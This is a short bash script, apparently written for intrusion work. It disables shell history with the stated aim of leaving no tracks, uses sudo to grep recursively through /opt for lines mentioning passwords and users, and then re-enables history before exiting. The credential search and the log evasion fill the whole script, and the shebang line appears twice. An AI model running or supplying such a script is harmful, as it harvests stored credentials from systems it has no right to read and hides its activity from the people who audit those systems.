#!/usr/bin/bash -l
#!/usr/bin/bash -l

# Turn off history to leave no tracks
set +o history

# Given a list of filesystems, crawl and
# look for value data
cd /opt
sudo grep -iR "password" * | grep -i "user"

# Turn on history and leave the system
set -o history

exit 0